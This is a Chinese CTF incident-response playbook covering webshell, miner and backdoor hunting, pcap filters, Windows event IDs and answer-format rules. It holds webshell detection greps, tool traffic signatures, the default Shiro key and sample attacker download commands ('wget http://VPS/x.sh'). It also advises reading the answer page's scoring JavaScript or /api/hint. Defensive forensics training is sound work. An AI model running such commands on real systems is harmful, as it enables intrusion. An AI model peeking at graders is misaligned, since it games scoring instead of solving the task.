# 应急响应总纲（决赛另一半 50% 分值）

> 赛制：给定被入侵的靶机/流量包/内存镜像，答"攻击者是谁、怎么进来的、干了什么、后门在哪"。**答题卡式计分**——每个要素是一个 flag/填空，答对才给分。
> 核心方法论（绿盟总结，倒推）：**攻击迹象 → 定位攻击者 → 行为分析 → 定位漏洞**。攻击者按"漏洞 → 攻击行为 → 攻击迹象"推进，你反着走。
> 开工顺序：先看答题卡问什么（问题清单决定排查方向）→ 按下面五步走 → 每挖到一个 flag/要素**立刻报告**（提交由人工做）。

### 本篇怎么用（按题目形态分流到专项篇）

本篇是**入口与总纲**，给的是通用五步链。题目形态明确时直接开专项篇，那里的深度和答题卡模板更细：

| 题目给的是 | 开哪 |
|---|---|
| Java 应用被入侵、磁盘上查不到马 | `内存马排查.md` |
| 内存镜像（.raw / .mem / .dmp / .vmem） | `内存取证.md` |
| 流量包（.pcap / .pcapng）、隧道、数据外传 | `应急-流量与隧道.md` |
| Windows 主机 / 事件日志 / 要建时间线 | `应急-Windows深度取证.md` |
| 勒索加密 / 钓鱼邮件 | `应急-勒索与钓鱼.md` |
| 完整攻击链路标（含应急 13 条） | `真题链库.md` B 部分 |

**答题卡六要素模板**、时间线还原、关键痕迹文件速查在本篇末尾，任何形态都适用。

## 五步排查链（每步都出分）

```
① 修复现场认知（什么系统/什么业务/什么日志可用）
② 入口分析（怎么进来的：webshell？弱口令？漏洞利用？——看日志和 WAF 记录）
③ 行为分析（干了什么：提权？横向？读数据？挖矿？）
④ 持久化排查（留了什么后门：webshell/账户/计划任务/启动项/SSH key/内存马）
⑤ 溯源收口（攻击者 IP/时间线/端口/漏洞类型 → 填答题卡）
```

## 常见事件类型与排查清单

### 1. Webshell 事件（出题率最高）

> **Linux 完整排查清单 + 7 类藏匿点变体库（含"格式不对的那一行""fd 已删除但还开着""文件大小异常"这类关键判据）见 `题型图鉴.md` §20 —— 上机排查类题先照那份清单一次贴全。**

```bash
# 找马：目录查杀 + 特征搜索双管齐下
# Windows：D盾 / 河马 一键扫 web 目录（比赛机常预装，没有就传）
# Linux 手工特征搜索：
grep -rE "eval\(|assert\(|system\(|passthru|shell_exec|base64_decode|gzinflate|str_rot13|ini_set\(|preg_replace.*e" /var/www/html --include="*.php" 2>/dev/null
find /var/www/html -mtime -7 -name "*.php" 2>/dev/null        # 最近新增/修改的 php
find /var/www/html -name ".*.php" 2>/dev/null                  # 隐藏马（.config.php 类）
```

- **答题卡常问**：webshell 文件名 / 完整路径 / 连接密码 / 类型（一句话/冰蝎/哥斯拉）
- **连接密码在哪**：一句话马的 `$_POST['xx']` 键名即密码；冰蝎马找 `password` 字段或 AES key 常量；哥斯拉找 `pass`/`key` 参数。D 盾会直接标出可疑变量
- **确认可用性**：蚁剑填 URL + 密码连一下，能连 = 答案验证成功
- 隐藏套路：图片马（`binwalk -e` 拆）、`.user.ini`/`.htaccess` 自包含马、多处重复马（全找齐，每处可能单独计分）

### 2. 挖矿事件

```bash
# 定位挖矿进程（CPU 是路标）
top -bn1 | head -20 ; ps aux --sort=-%cpu | head -10
# 网络外连 = 矿池地址
netstat -antlp | grep ESTABLISHED | awk '{print $5}' | sort | uniq -c | sort -rn
ls -la /proc/$(pgrep -f kdevtmpfs|xargs)/exe 2>/dev/null   # 进程文件真实路径（已删除的挖矿马看 (deleted)）
```

- **答题卡常问**：矿池域名/IP:端口、钱包地址（在挖矿配置文件/启动命令里 `strings 矿马 | grep -E "stratum|pool|wallet"`）、攻击者入侵方式（日志里找根因：通常是 RDP/SSH 爆破成功或 webshell）
- Windows 挖矿：`msinfo32`/任务计划里看启动项命令（**启动项命令本身就是 flag**，知攻善防真题）、`netstat -ano` 找矿池、对应 PID 找文件路径

### 3. 后门与持久化排查（Linux）

```bash
# 账户层
cat /etc/passwd | awk -F: '$3==0{print}'          # uid=0 的多余账户
cat /etc/passwd /etc/shadow | grep -E '\$6\$|\$5\$' # 有密码哈希的可疑户
last / lastlog / lastb                              # 登录成功/从未登录/登录失败
# 启动与定时
crontab -l ; cat /etc/crontab ; ls /etc/cron.*/     # 定时后门（知攻善防/长亭真题常考）
systemctl list-unit-files --state=enabled ; cat /etc/rc.local
cat /root/.ssh/authorized_keys                      # SSH 公钥后门
# 进程与 Rootkit
ps aux 与 /proc 目录数对比；unhide quick            # 隐藏进程
rkhunter --check ; cat /etc/ld.so.preload           # 劫持（ld.so.preload 为空才正常）
# 命令被替换
rpm -Va | grep -E "5|T" (CentOS) ; debsums -c (Debian)  # 校验系统命令 md5
ls -la /usr/bin/* /bin/* | grep -E "2024|2025"      # 时间异常的命令文件
```

### 4. 后门与持久化排查（Windows）

```cmd
net user（直接看）+ 注册表隐藏账户：HKLM\SAM\Domains\Account\Users（Names 下多出来的）
netstat -ano 找外连 → tasklist /svc 对 PID 定位进程与文件路径
计划任务：schtasks /query /fo LIST /v（看命令和作者）
启动项：HKLM/HKCU ...\Run、shell:startup、服务：sc query state= all
预读文件取证：C:\Windows\Prefetch（看攻击者跑过什么工具，如 whoami.exe、mimikatz 时间线）
日志（事件查看器 / EventLogExplorer）：
  4624 登录成功（Logon Type 10=RDP 远程，3=网络）/ 4625 失败（爆破证据）/ 4720 新建账户 / 7045 新装服务（后门服务常在这）
RDP 记录：HKCU\Software\Microsoft\Terminal Server Client\Servers
```

### 5. 流量包分析（给出 .pcap）
```bash
# WSL: tshark（先看协议分层和会话）
tshark -r x.pcap -q -z io,phs                # 协议统计总览
tshark -r x.pcap -q -z conv,tcp              # 会话排行：外连最多的 IP 就是重点
tshark -r x.pcap -Y "http.request" -T fields -e ip.src -e http.request.full_uri | sort | uniq -c | sort -rn
tshark -r x.pcap --export-objects http,./out # 直接导出 HTTP 对象（webshell 文件、下载的马都在这）
# 追流：右键可疑流 follow tcp stream（Wireshark）或 tshark -z follow,tcp,ascii,N
```

- **Webshell 工具流量特征（按工具认凶手）**：
  - **中国菜刀**：明文 `z0=` 开头 base64（解码是 `@ini_set("display_errors","0")`）
  - **蚁剑**：请求体含 `ini_set("display_errors","0")`；响应 base64 前后各随机 2 字符；`@ini_set` 出现在请求体
  - **冰蝎**：全程 AES，Accept 头 `text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2`；2.0 首包 GET 协商 key，3.0 key 在密码 md5 前16位；UA 十六连随机
  - **哥斯拉**：Cookie 值以 `;` 结尾；pass/key 由 md5 派生；响应体加密（找 `Set-Cookie` 异常）
- **解题**：认出工具 → 找 key（第一个请求/马源码里）→ 工具解密（蓝队分析研判工具箱支持冰蝎/哥斯拉/Shiro/Log4j2 一键解）→ 还原攻击者执行过的每条命令（flag 常在命令回显里：whoami、cat flag、内网 IP）

## 流量取证逐问题型速查（给 .pcap 时先扫这张表，再翻 `应急-流量与隧道.md`）
> 实证出处：**2025 京津冀大学生信息安全网络攻防大赛决赛应急响应**（14 问全给 pcap，一问一条，按攻击链顺序排）。
> 用法：**先按"问法"对到本表的过滤器**，拿到候选集，再去 `应急-流量与隧道.md` 找该工具的解码链。
> 为什么需要这张表：那篇是**技术分节**（解码 / 隧道 / 外传各自成节、近 400 行），
> 比赛时按"第 7 问要什么"去翻很慢；本表是**按问法反查**的索引。

| 问法（题面措辞） | Wireshark / tshark 过滤器 | 答案形态与坑 |
|---|---|---|
| 攻击者与受害者的**公网 IP** | `http.request.uri == "/login.php"` 定位爆破点 | 空格分隔；**别把 XFF 当真实源**，看 TCP 五元组 |
| 爆破得到的**账号密码** | 同上，**翻到最后一条**请求 | 格式 `账号/密码`（如 `admin/password`） |
| **XXE 读取了哪些文件** | `http contains "xxe SYSTEM"` | **按读取顺序**、英文逗号分隔、**绝对路径** |
| 对哪个目录做了**目录遍历** | `http.request.method == "GET"` | **要拼完整 URL**（含端口+目录+/）：`http://ip:9999/admin/` |
| 写入的 **webshell 内容** | `http.request.method == "POST"` → 再 `http contains "1.php"` | **完全匹配**；三层剥离见 `应急-流量与隧道.md`；注意"第一个"= frame 最小的 |
| **webshell 连接工具/版本** | `http.request.uri contains "2.php"` → 看 UA | 格式 `工具名/版本`（如 `antSword/v2.1`）—— **版本号要带工具名** |
| **扫描脚本** 名 / IP 范围 / 端口 / 超时 | `http contains "scan.php"` | 形如 `scan.php;1.1.1.1-1.1.1.254;80,8080;0.5s` —— **IP 写 `起-止`、端口逗号、超时带单位** |
| **虚拟终端执行的前 3 条命令** | `http.request.uri contains "2.php"` | 逗号分隔，**剔除工具自动发的 `cd`**、按流顺序 —— 见 `应急-流量与隧道.md`「有序命令序列」 |
| 攻击者 **VPS 的 IP** | 继续看同一马的全部交互 | 通常在后续命令回显里（`wget http://VPS/x.sh`） |
| 打内网用的**漏洞 CVE 编号** | `http contains "rememberMe"` | 靠组件特征反推（Shiro550 = `CVE-2016-4437`） |
| 漏洞用的**密钥** | 同上的那条 Cookie | 默认 `kPH+bIxk5D2deZiIxcaaaA==`；能解开即确认 550 |
| 拿到 shell 后**前 3 条命令** | 换到内网靶机的那台马的 URI | 同上，逗号分隔 |
| **SSH 私钥**片段（如"后 8 位"） | 在该马响应体里找 `-----BEGIN` / base64 尾巴 | 题面写"等号也算"就**别漏 `=`** |
| 下载内网脚本用的**命令** | `http contains "ping.sh"` 或导出对象 | 答案就是整条命令（如 `wget http://VPS/ping.sh`） |

**三个通用纪律（这 14 问反复踩）**
1. **格式要求全在题干里**：分隔符（空格/逗号/斜杠）、大小写、绝对路径、"含等号"、"完全匹配" —— 答题前**抄到记事本逐字核对**
2. **答案顺序即分值**："按读取顺序" / "前 N 条" ⇒ 必须保序，别按字典或字母排序
3. **URL 编码要解码**，但问的是**解码后的内容本体**，不是整条请求

## ★ 第二现场（磁盘上找不到证据时，去这五个地方）

> 实证出处：Solar 杯官方题解（第一/二届）+ 2026-5 月月赛。
> **这是应急题最常见的卡点**：题目说"马被删了/被入侵了"，但你在 web 目录找不到任何东西。
> 根因：**攻击可见的痕迹不在"业务目录"，而在运行时/缓存/服务定义里**。

| 现象 | 判据 | 命令 |
|---|---|---|
| 磁盘无马，但流量里有 `b.jsp` 交互 | **Tomcat 把 JSP 编译后的 Java 源码留在 work 目录，马删了源码还在** | `ls <Tomcat_home>/work/Catalina/<host>/<webapp>/org/apache/jsp/`<br>→ 读 `b_jsp.java` 即可判定哥斯拉/冰蝎（源码里可见 `defineClass`、AES key） |
| PHP 站，马一闪就没 | **缓存马**有存活期会自己消失（`/cache/.../configs.cache.php`）；**持久马**（不死马）常伪装成 `.config.php` | 在流量里搜"写文件"的十六进制写入，反推落盘路径与内容 |
| Java 应用被打，磁盘无马 | **`/tmp/nacos_data_temp` 这类注入包**是恶意 Java 包 ⇒ 反编译看 `defineClass`（Base64 类字节） | `grep -r "defineClass" /tmp/ 2>/dev/null` |
| 后门只对特定请求生效 | **内存马要从"代码里的硬编码触发条件"反查工具**（Nacos 案例：`doFilter` 要求 `Referer: https://www.google.com/` + `x-client-data: cmd/rebeyond/godzilla` ⇒ 对应 `c0olw/NacosRce`） | **别从 CVE 入手** —— Nacos 的 CVE 极少、只有 CNVD，从 CVE 库查会一无所获 |
| 服务列表里有"看着像但不是"的服务 | **差一个字母就是后门**（见下表） | `ls /etc/systemd/system/`；`grep -rh "ExecStart=" /etc/systemd/system/ \| grep -vE "/usr/(s?bin\|lib)/"` |

### 伪装系统服务：差一个字母（跨平台对照）

| 平台 | 真 | 假（实测案例） | 破绽 |
|---|---|---|---|
| Linux | `systemd-journald` | `/etc/systemd/system/systemd-journal**ed**.service` → 指 `/usr/local/systemd/journal**ed**` | **系统服务不会装在 `/usr/local`** ⇒ 这是最硬的判据 |
| Windows | `svchost` | `svh**o**st` | 服务二进制路径在 `C:\Users\Public\`、`%TEMP%`、根目录即可疑 |
| Redis/Mysql 等 | 正常可执行 | `/tmp/.X11-unix/...` 或 `/dev/shm/...` 下的同名文件 | 系统服务不会从 `/tmp`、`/dev/shm` 启动 |

### ★ Windows 事件 ID 只要记 6 个（够答 90% 的问法）

| ID | 含义 | **答题要点** |
|---|---|---|
| **4625** | 登录失败 | **最早一条 = 爆破开始时间**（题目常问这个） |
| **4624** | 登录成功 | `Logon Type 10` = RDP 远程；`3` = 网络（SMB/共享） |
| **4720** | 创建用户 | 后门账户的**创建时间**；配合 `hidden$` 这类 `$` 结尾隐藏户 |
| **4648** | 显式凭据登录 | **过滤后取第一条的 IP = 攻击者 IP**（比 4624 更准，因为它是"显式带凭据"的动作） |
| **7045** | 安装服务 | 后门服务名 + 服务文件路径 |
| **4104** | PowerShell 脚本块 | **无文件攻击的救命稻草**：能还原攻击者执行过的脚本原文 |

### ★ 时间簇判据（提速神器，30 秒定位事件时刻）

```
正常业务的文件 mtime 是【分散】的；
攻击者的批量操作（上传马、加密文件、批量下载）会让 mtime 【高度聚集在一两分钟内】。
⇒ 把可疑目录按 mtime 排序，找"扎堆的那一段"，就是事件时刻。
```
- **勒索场景尤其准**：勒索信本身可能没有时间戳 ⇒ 看**被加密文件 mtime 的聚集点**（彼此差几秒）
- **进系统第一件事就这么干**，比逐条读日志快一个量级

## 时间线还原（溯源收口的标准产出）

```bash
# Linux 时间线锚点
stat 文件          # 访问/修改/变更三时间
last / lastb       # 登录时间线
grep -E "Accepted|Failed" /var/log/secure*    # SSH 登录记录（CentOS: secure，Ubuntu: auth.log）
# Windows：4624/4625/4720/7045 事件时间排序 + Prefetch 工具执行时间
```

答题卡六要素输出模板（比赛直接照这个填）：

```
攻击者IP：        （首次出现 + 高频恶意请求的源IP，X-Forwarded-For 伪造要看 XFF 字段）
攻击时间：        （首次恶意请求 / 爆破成功时间点，注意时区）
攻击漏洞：        （SQLi / 文件上传 / RCE / 弱口令，从请求特征判断）
Webshell路径：    （完整路径 + 文件名 + 密码）
提权方式：        （内核EXP / SUID / 服务提权 / Potato）
后续行为：        （横向IP、读过的文件、留的后门清单）
```

## 答题卡题型全景（来自真实赛题，按此准备才不漏分）

> 以下题型取自**第二届 Parloo CTF 应急响应挑战赛**（两题各 22 问）、**Solar杯应急响应挑战赛**、**知攻善防靶机**的真实答题卡。
> **先扫这张表找对口的问法，再去对应章节找动作**——比漫无目的全盘扫快得多。

### A. 身份与时间（几乎每题必有）

| 问法 | 去哪找 |
|---|---|
| 攻击者 IP（可能问"攻击 IP 1 / 攻击 IP 2"两个） | web access.log 的应用层真实源（不是 XFF 伪造值）；`lastb` / 4625 高频源 |
| **暴力破解开始时间** / 最早攻击时间 | 第一条失败请求的时间戳；`lastb` 最早一条；4625 首条。**注意时区** |
| 攻击者邮箱 | 源码/配置里的联系方式；钓鱼邮件 `Return-Path`；`whois` 反查；泄露的群/简历 |
| 恶意的 ip 和端口 | 木马回连地址：netstat / `netscan` / 挖矿池；或 webshell 请求目标的 IP:PORT |

### B. 入口与落地物

| 问法 | 去哪找 |
|---|---|
| webshell 路径 / **密码**（可能问"密码 1 / 密码 2"两处） | 一句话马 `$_POST['x']` 的键名、冰蝎 `password`、哥斯拉 `pass/key`；**多处马分开计分** |
| **钓鱼文件的哈希（常要求 32 位大写）** | `md5sum` 后**转大写**——格式错误照样判错，这是丢分重灾区 |
| 恶意程序的 MD5 | `md5sum` / `dumpfiles` 出的样本算；**注意大小写要求** |
| web 服务泄露的关键文件名 | `.git` / 备份文件 / 配置文件（`config.php`、`.env`、`web.config`） |
| 存在危险功能的**操作系统路径** | `cmd.exe`、`powershell.exe`、`wscript`、`certutil`、`bitsadmin` 的完整路径；或 webshell 落地目录 |

### C. 权限与持久化（真实赛题的高频区）

| 问法 | 去哪找 |
|---|---|
| **隐藏账户的密码**（不是账户名！） | `$` 结尾账户 / uid=0 多余户 → 从 `/etc/shadow` 或 SAM 提 hash → **hashcat / john 破解出明文** |
| **攻击者使用的提权用户密码** | history / 配置文件 / 内存里的凭据；或该账户的 hash 破解 |
| **权限维持方法的服务名称** | `systemctl list-unit-files --state=enabled`、`sc query`、7045 事件、`/etc/init.d/`、计划任务名 |
| **被劫持的程序名** | `ld.so.preload` 指向的 so；被替换的 `ls`/`ps`/`netstat`（比对 md5）；Windows IFEO / Image File Execution Options |
| 恶意账户名称的 **md5** | 账户名算出 md5（题面明确要 md5 时别交明文） |
| 计划任务 / 启动项 / 服务里的后门 | crontab、`/etc/cron.*`、Run 键、WMI 订阅 |

### D. 藏 flag 的位置（真实赛题爱藏在这些地方）

Parloo 真题把 flag 分散在：**堡垒机 / WAF / MySQL / 内部群**；还有"维护页面获取到的敏感内容"。

| 位置 | 怎么找 |
|---|---|
| 堡垒机 | 堡垒机的会话记录 / 命令审计日志 / 配置 |
| WAF | WAF 的规则文件 / 拦截日志 / 隐藏目录 |
| MySQL | `flag` 库表；或 `general_log` / `binlog` 里的记录 |
| **内部群 / 聊天记录** | 企微 / 钉钉 / QQ 的本地消息库（见下方"聊天取证"） |
| 维护页面 / 后台 | 登录后翻功能页，"敏感内容"常是明文 PII |
| 项目经理身份证号等 **PII** | 简历（`简历.exe` / `.docx`）→ `strings` / 解压 / `exiftool`；数据库表；共享盘文档 |

### E. 题面里看起来吓人但其实很直接的两类

| 问法 | 动作 |
|---|---|
| **邮件头里"发件顺序"/"域名路径"**（Solar杯签到题） | `Received:` 链**从下往上读**，按题面格式拼（如 `flag{a.com\|b.com\|c.com}`）。**注意格式符** |

### 聊天记录取证（企微 / 钉钉 / QQ）

真实赛题在"内部群"里藏 flag，这块容易漏：

| 平台 | 本地位置（Windows） |
|---|---|
| 微信 / 企微 | `Documents\WeChat Files\<wxid>\Msg\*.db`（SQLite，用 `sqlcipher` 或工具解）、`FileStorage\MsgAttach` |
| 钉钉 | `%APPDATA%\DingTalk\<数字ID>_v2\`、`SQLite` 库 + `.db` |
| QQ | `Documents\Tencent Files\<QQ号>\` 下的 `Msg3.0.db`（加密） |

### 答案格式纪律（每条都踩过坑）

1. **哈希要 32 位大写**时，`md5sum` 出来是小写——**记得转大写**。
2. **flag 拼接格式**看清分隔符（`|`、`_`、`-`）与顺序（邮件头是**从下往上**）。
3. **时间要标时区**，题目要 UTC 就换算（差 8 小时是老坑）。
4. **问密码就别交账户名，问 md5 就别交明文。**逐字读题。
5. IP 交**应用层真实源**，不是 CDN / 跳板。
6. **md5 类要看"对什么算"**：实测口径是 `md5('flag{a-b-c}')` —— **对带 `flag{}` 包裹的整串算**，不是只对内容算。提交前先在本地算一遍对拍。
7. **答案带不带包裹符号要看清**：有的答案要求不要带 `##` 之类的标记；有的要求 `Cache-Control: no-cache` 连值一起写。这类差异每年都在扣分。
8. **遇到"答案格式不明"（枚举几十种格式全错）⇒ 先读答题页 JS 判分逻辑或 `/api/hint`，不要无限枚举。**（实测：5 道时间题枚举 60+ 格式全错，成本远超读一次 JS）

## 关键痕迹文件速查

| 系统 | 文件/位置 |
|------|----------|
| Linux 登录 | `/var/log/secure`（CentOS）/ `/var/log/auth.log`（Ubuntu）、`last`、`lastb`、`/var/log/wtmp`（二进制，utmpdump 读） |
| Linux Web | `/var/log/nginx/access.log`、`/var/log/apache2/access.log`、`/var/log/httpd/` |
| Linux 其他 | `/var/log/cron`、`~/.bash_history`（含删除前的：`cat /home/*/.bash_history`）、`/var/log/messages` |
| Windows | 事件日志（4624/4625/4720/7045）、Prefetch、注册表 Run 键、`C:\Users\*\AppData\Roaming\Microsoft\Windows\Recent`（最近文件）、IIS 日志 `C:\inetpub\logs\LogFiles` |
| 数据库 | MySQL `general_log`、慢日志；`binlog`（还原攻击者执行过的 SQL）；Redis `appendonly.aof` |

## 节奏纪律（应急半场）

1. **先读答题卡再动手**：题目问什么查什么，不漫无目的全盘扫（时间不够）
2. **一题一靶机**：应急题通常一题一台机器/一个包，做完提交就走
3. **flag 即报**：和渗透半场一样，挖到立刻报告（提交归人工）
4. **工具先行**：LinuxCheck（一键巡检脚本）、D盾/河马（Windows 查马）、蓝队研判工具箱（流量解密）——三件套常备 U 盘
5. **渗透+应急联动**：应急靶机里拿到的密码/IP/漏洞入口，顺手试试能不能直接拿 shell（部分赛制应急靶机也能拿 flag 权限分）

## 假点

- **答题页格式不明时不要枚举** → 先读页面 JS 的判分逻辑或找 `/api/hint`，枚举 60+ 格式的代价远高于读一次 JS
- **磁盘上找不到马时不要放弃这块** → 木马 `.php` 可能已被**本地杀软隔离**（本机 Defender 就会干这事）⇒ 靠旁证定位：上传目录残留、文件时间戳、异常尺寸、进程列表、网络连接
- 日志里 IP 很多 → 以**请求特征**判凶手（高频 POST、异常 UA、成功登录的爆破源），不是数谁请求多
- `last` 显示的 IP 是内网网关 → 攻击者走了跳板/NAT，看应用层日志（access.log）里的真实源
- 找到一个马就交差 → 隐藏马/多处马常各算一分，`find` 按 mtime 全量过一遍再收工
- 时区没换算 → 日志 UTC vs 本地时间差 8 小时，答题卡时间全错
- 冰蝎流量解不开 → 3.0 key = md5(密码)[:16]，先找密码；2.0 在第一个 GET 包里
- Windows 事件日志被清 → 看 Prefetch + USN journal + 文件系统时间线，痕迹清不完
